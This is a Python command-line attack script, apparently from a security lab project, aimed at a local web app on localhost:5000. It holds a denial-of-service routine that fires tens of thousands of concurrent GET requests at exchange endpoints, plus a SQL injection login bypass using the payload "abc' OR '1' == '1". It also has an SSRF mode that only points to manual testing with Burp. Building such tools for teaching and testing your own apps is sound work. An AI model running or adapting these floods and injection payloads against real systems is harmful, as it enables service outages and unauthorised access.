# Accept arguments of attack type
# Enter Login information
# Then start attack

import argparse
from ast import arg
import getpass
from pathlib import Path
import requests
import time
import aiohttp
import asyncio
import sys

attack_choices = [
    'dos',
    'sql_injection',
    'secret_leak',
    'ssrf',
]


class PasswordPromptAction(argparse.Action):
    def __init__(self,
                 option_strings,
                 dest=None,
                 nargs=0,
                 default=None,
                 required=False,
                 type=None,
                 metavar=None,
                 help=None):
        super(PasswordPromptAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            nargs=nargs,
            default=default,
            required=required,
            metavar=metavar,
            type=type,
            help=help)

    def __call__(self, parser, args, values, option_string=None):
        password = getpass.getpass()
        setattr(args, self.dest, password)


class AsyncHttpClient:
    def __init__(self):
        self.session = None

    async def login(self, username, password):
        self.session = aiohttp.ClientSession()
        try:
            login_url = 'http://localhost:5000/login'
            login_data = {'username': username, 'password': password}
            print(login_data)
            response = await self.session.post(login_url, data=login_data)
            if response.status == 200:
                print("Login successful")
            else:
                print("Login failed")
                print(await response.text())
                exit(1)
                
        except Exception as e:
            print(f"Error during login: {e}")

    async def get(self, url):
        if not self.session:
            print("Session not initialized. Please login first.")
            return

        try:
            response = await self.session.get(url)
            if response.status == 200:
                data = await response.text()
                # print(f"GET request to {url} successful. Data: {data}")
            else:
                print(
                    f"GET request to {url} failed. Status code: {response.status}")
        except Exception as e:
            print(f"Error during GET request: {e}")

    async def post(self, url, data):
        if not self.session:
            print("Session not initialized. Please login first.")
            return

        try:
            response = await self.session.post(url, data=data)
            if response.status == 200:
                data = await response.text()
                # print(f"POST request to {url} successful. Data: {data}")
            else:
                print(
                    f"POST request to {url} failed. Status code: {response.status}")
        except Exception as e:
            print(f"Error during POST request: {e}")

    async def close_session(self):
        if self.session:
            await self.session.close()
            print("Session closed")


class SyncHttpClient:
    def __init__(self, username, password):
        self.session = requests.Session()
        self.login_url = "http://127.0.0.1:5000/login"
        self.username = username
        self.password = password
        self.login()

    def login(self):
        login_data = {
            "username": self.username,
            "password": self.password
        }
        response = self.session.post(self.login_url, data=login_data)
        if response.status_code == 200:
            print(f"Logged in as {self.username}")
        else:
            print("Login failed")

    def get(self, url):
        response = self.session.get(url)
        return response.text

    def post(self, url, data):
        response = self.session.post(url, data=data)
        return response.text


parser = argparse.ArgumentParser()

parser.add_argument('-a', dest='attack', required=True, choices=attack_choices,
                    help='Supported Attacks. Use "list" to see all options.', metavar='')

parser.add_argument('-u', dest="username")
parser.add_argument('-p', dest='password',
                    action=PasswordPromptAction, type=str, required=True)

args = parser.parse_args()

async def dos_attack(username, password):
    base_url = "http://localhost:5000"  # Replace with your server URL

    client = AsyncHttpClient()

    await client.login(username, password)

    endpoint = "exchange/US"
    await client.get("http://localhost:5000/exchange/US")

    # Record the start time
    start_time = time.time()
    duration = 60

    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time

        # Send 10 concurrent GET requests
        urls = ['http://localhost:5000/exchange/US', 'http://localhost:5000/exchange/TO',
                'http://localhost:5000/exchange/LSE', 'http://localhost:5000/exchange/V'] * 10000
        tasks = [client.get(url) for url in urls]
        await asyncio.gather(*tasks)

        # Check if the desired duration has been reached
        if elapsed_time >= duration:
            print(
                f"Duration of {duration} seconds has elapsed. Exiting the loop.")
            break

    await client.close_session()

async def sql_injection_attack():
    base_url = "http://localhost:5000"  # Replace with your server URL

    client = AsyncHttpClient()

    # Appending malicious SQL query to username
    sql_attack_string = "abc' OR '1' == '1"

    await client.login(sql_attack_string, "noop")

    await client.close_session()

def ssrf_help():
    print("""
        SSRF attack isn't automated by script. See project notes for doing an SSRF. In short, install Burp community tool and inspect post requests for URL injection opportunity in the about.html page
            """)


print("Starting Attack: ", args.attack)

if args.attack == 'dos':
    asyncio.run(dos_attack(args.username, args.password))

if args.attack == 'sql_injection' or args.attack == 'secret_leak':
    asyncio.run(sql_injection_attack())

if args.attack == 'ssrf':
    ssrf_help()